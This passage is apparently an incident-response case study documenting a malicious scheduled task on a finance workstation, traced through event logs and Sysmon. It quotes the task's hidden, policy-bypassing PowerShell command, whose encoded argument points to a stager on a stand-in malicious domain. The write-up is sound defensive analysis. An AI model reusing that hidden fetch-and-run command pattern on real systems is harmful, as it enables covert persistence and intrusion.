| **Case 03** | [Endpoint Persistence & Event Log Analysis](Case-03-Endpoint-Persistence-Analysis/README.md) | Windows Event Logs, Sysmon, Registry Run Keys | **Completed** |
# Case Study 03: Endpoint Persistence & Scheduled Task Analysis

## Executive Summary
* **Date of Investigation:** August 2026
* **Investigator:** Atta Kouhzad
* **Threat Classification:** Persistence via Scheduled Tasks & Living-off-the-Land Binaries (MITRE ATT&CK TA0003 / T1053.005)
* **Target Asset:** `10.0.2.75` (`FINANCE-DESK-04`)
* **Incident Status:** Identified, Isolated & Remediated

---

## Technical Scenario & Trigger
An automated EDR alert flagged an anomalous scheduled task creation event on endpoint `FINANCE-DESK-04`. The task was configured to run with elevated permissions (`SYSTEM`) and invoked a hidden PowerShell execution string targeting an external IP address. The objective of this investigation was to trace the task creation mechanism, determine the initial execution vector, and audit endpoint registry artifacts for additional persistence mechanisms.

---

## Technical Investigation & Key Findings

### Phase 1: Artifact Discovery & Telemetry Correlation
* **Event Log Identification:** Analysis of Windows Security Event Logs (`TaskScheduler/Operational`) revealed **Event ID 4698** (A scheduled task was created) under the task name `Updater_Service_v2`.
* **Sysmon Analysis:** Sysmon **Event ID 1** (Process Creation) recorded `schtasks.exe` executed via a compromised local administrator session.
* **Payload Inspection:** The scheduled task action was configured as:
  ```cmd
  powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Enc aHR0cHM6Ly9tYWxpY2lvdXMtZG9tYWluLmNvbS9zdGFnZXIucHMx
